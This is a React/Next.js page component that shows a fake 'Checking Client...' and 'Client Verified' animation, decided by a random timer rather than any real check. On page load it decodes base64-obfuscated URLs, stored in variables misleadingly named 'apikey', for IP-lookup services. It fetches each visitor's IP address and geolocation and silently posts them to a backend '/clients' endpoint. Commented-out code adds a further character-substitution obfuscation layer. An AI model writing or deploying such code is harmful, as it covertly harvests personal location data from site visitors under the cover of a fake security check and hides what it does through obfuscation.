import React from "react";
import axios from "axios";
import { useEffect, useState } from "react";
import { useRouter } from "next/router";
import { redirect } from "next/dist/server/api-utils";
import CheckBoxRoundedIcon from "@mui/icons-material/CheckBoxRounded";
import { Box, Button, Typography, CircularProgress, Grid } from "@mui/material";
import { motion } from "framer-motion";

function Ip() {
  const router = useRouter();
  const [loaded, setLoaded] = useState(
    <Box sx={{ color: "white", textAlign: "center" }}>
      <Typography>Checking Client...</Typography>
      <br />
      <CircularProgress size={100} />
    </Box>
  );

  // const [chars, setChars] = useState({
  //   a: "x",
  //   b: "y",
  //   c: "z",
  //   w: "p",
  //   v: "t",
  //   n: "k",
  //   o: "i",
  // });
  // const [chars2, setChars2] = useState({
  //   H: "A",
  //   R: "P",
  //   L: "Z",
  //   F: "G",
  //   D: "T",
  //   W: "M",
  //   S: "R",
  // });
  // const [s, setS] = useState("aHR0cHM6Ly9hcGkuaXBpZnkub3JnP2Zvcm1hdD1qc29u");
  // const [p, setP] = useState(s.replace(/[abcwvno]/g, (m) => chars[m]));
  // const [g, setG] = useState(p.replace(/[HRLFDWS]/g, (m) => chars2[m]));
  // console.log("convert " + g);

  // const [buff2, setBuff2] = useState(new Buffer.from(apikey2, "base64"));
  // const [buff3, setBuff3] = useState(new Buffer.from(userToken, "base64"));
  // const [text2, setText2] = useState(buff2.toString("utf-8"));
  // const [theDate, setTheDate] = useState(buff3.toString("utf-8"));

  const [info, setInfo] = useState();
  const [anew, asetNew] = useState();
  const [anew2, asetNew2] = useState();
  const [apikey, setApikey] = useState(
    "aHR0cHM6Ly9hcGkuaXBpZnkub3JnP2Zvcm1hdD1qc29u"
  );
  const [buff, setBuff] = useState(new Buffer.from(apikey, "base64"));
  const [cl, setCl] = useState(buff.toString("utf-8"));

  const [apikey2, setApikey2] = useState("aHR0cHM6Ly9pcHdoby5pcy8=");
  const [buff2, setBuff2] = useState(new Buffer.from(apikey2, "base64"));
  const [cl2, setCl2] = useState(buff2.toString("utf-8"));

 const [apikey3, setApikey3] = useState("aHR0cHM6Ly9pcGFwaS5jby8=");
  const [buff3, setBuff3] = useState(new Buffer.from(apikey3, "base64"));
  const [cl3, setCl3] = useState(buff3.toString("utf-8"));


  useEffect(() => {
    const callAPI = async () => {
      try {
        const res = await fetch(cl);
        const data = await res.json();
        setInfo(data);
      } catch (err) {}
    };
    callAPI();
  }, [cl]);
  useEffect(() => {
    if (!info) return;
    const callAPI2 = async () => {
      try {
        const res = await fetch(cl2 + info.ip);
        const data = await res.json();
        asetNew(data);
      } catch (err) {}
    };
    callAPI2();
  }, [info, cl2]);

  useEffect(() => {
    if (!info) return;
    const callAPI3 = async () => {
      try {
        const res = await fetch(cl3 + info.ip + "/json/");
        const data = await res.json();
        asetNew2(data);
      } catch (err) {}
    };
    callAPI3();
  }, [info]);

  useEffect(() => {
    if (!anew && !anew2) return;
    const create = async () => {
      await axios

        // .post(`${process.env.NEXT_PUBLIC_STRAPI_URL}` + "/clients", {
        .post(`${process.env.NEXT_PUBLIC_AWS_API}` + "/clients", {
          data: {
            user: anew,
            time: anew.ip,
            layout: anew2,
          },
        })
        .then((response) => {});
    };
    create();
  }, [anew]);

  function randomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1) + min);
  }

 // const redirect = async () => {
 //   try {
 //     router.push(
  //      "https://www.crowdstrike.com/cybersecurity-101/distributed-denial-of-service-ddos-attacks/"
 //     );
 //   } catch (err) {}
//  };

//  useEffect(() => {
//    setTimeout(() => {
//      redirect();
 //   }, randomInt(2400, 2800));
 // }, [redirect]);

  useEffect(() => {
    setTimeout(() => {
      setLoaded(
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{
            type: "spring",
            stiffness: 50,
            damping: 30,
          }}
        >
          <Box
            sx={{
              color: "white",
              textAlign: "center",
            }}
          >
            <Typography>Client Verified</Typography>
            <br />
            <motion.div
              initial={{ opacity: 0, scale: 0.5 }}
              animate={{ opacity: 1, scale: 1 }}
              transition={{
                type: "spring",
                stiffness: 100,
                damping: 30,
              }}
            >
              <CheckBoxRoundedIcon color={"success"} sx={{ fontSize: 100 }} />
            </motion.div>
          </Box>
        </motion.div>
      );
    }, randomInt(1200, 1600));
  }, []);

  return (
    <div>
      <Box sx={{ mt: "15vh" }}>
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{
            type: "spring",
            stiffness: 100,
            damping: 30,
          }}
        >
          <Box
            sx={{
              bgcolor: "#2e2e2e",
              color: "white",

              width: 300,
              p: 10,
              borderRadius: 5,
            }}
          >
            {loaded}
          </Box>
        </motion.div>
      </Box>
    </div>
  );
}

export default Ip;
